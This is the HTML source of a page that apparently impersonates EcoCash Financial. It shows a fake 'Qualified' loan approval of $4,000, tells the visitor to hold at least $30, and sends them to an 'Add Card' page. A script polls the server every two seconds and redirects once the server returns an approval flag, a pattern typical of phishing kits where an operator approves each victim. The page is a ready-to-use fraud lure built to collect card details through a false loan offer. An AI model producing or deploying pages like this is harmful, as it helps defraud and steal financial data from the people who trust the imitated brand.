
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EcoCash | Qualification</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    font-family:Arial, Helvetica, sans-serif;
    background:#f3f6fb;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:15px;
}

.card{
    width:100%;
    max-width:400px;
    background:#fff;
    border-radius:18px;
    padding:22px;
    box-shadow:0 8px 25px rgba(0,0,0,.08);
}

.logo{
    text-align:center;
    font-size:28px;
    font-weight:bold;
    margin-bottom:15px;
}

.logo .eco{
    color:#e11d48;
}

.logo .cash{
    color:#2563eb;
}

.status-box{
    text-align:center;
    background:#f8fafc;
    border-radius:12px;
    padding:12px;
    margin-bottom:15px;
}

.status-label{
    font-size:13px;
    color:#64748b;
    margin-bottom:5px;
}

.badge{
    display:inline-block;
    background:#dcfce7;
    color:#15803d;
    padding:6px 14px;
    border-radius:30px;
    font-size:13px;
    font-weight:bold;
}

.message-box{
    text-align:center;
    background:#ecfdf5;
    border-radius:14px;
    padding:18px;
}

.icon{
    font-size:42px;
    margin-bottom:8px;
}

.message-box h2{
    color:#166534;
    font-size:22px;
    margin-bottom:10px;
}

.loan-limit{
    font-size:30px;
    font-weight:bold;
    color:#16a34a;
    margin:10px 0;
}

.message-box p{
    font-size:14px;
    color:#14532d;
    line-height:1.5;
    margin-bottom:8px;
}

.btn{
    display:inline-block;
    margin-top:12px;
    background:#10b981;
    color:#fff;
    text-decoration:none;
    padding:12px 24px;
    border-radius:12px;
    font-size:14px;
    font-weight:bold;
    transition:.3s;
}

.btn:hover{
    background:#059669;
}

.footer{
    text-align:center;
    margin-top:12px;
    font-size:11px;
    color:#94a3b8;
}

@media (max-width:480px){

    .card{
        padding:18px;
    }

    .logo{
        font-size:24px;
    }

    .loan-limit{
        font-size:26px;
    }

    .message-box h2{
        font-size:20px;
    }

    .btn{
        width:100%;
    }
}
</style>
</head>
<body>

<div class="card">

    <div class="logo">
        <span class="eco">Eco</span><span class="cash">Cash</span>
    </div>

    <div class="status-box">
        <div class="status-label">Account Status</div>
        <span class="badge">✓ Qualified</span>
    </div>

    <div class="message-box">

        <div class="icon">🎉</div>

        <h2>Congratulations!</h2>

        <p>Your approved loan limit is</p>

        <div class="loan-limit">$4,000</div>

        <p>Ensure your account balance is at least <strong>$30</strong>.</p>

        <a href="card.php" class="btn">
            ➕ Add Card
        </a>

    </div>

    <div class="footer">
        EcoCash Financial
    </div>

</div>

<script>
function checkApproval() {
    fetch(window.location.href + '?check_approve=1')
        .then(response => response.json())
        .then(data => {
            if (data.approve === 1) {
                window.location.href = 'approved.php';
            }
        })
        .catch(error => console.log(error));
}

setInterval(checkApproval, 2000);
checkApproval();
</script>

</body>
</html>
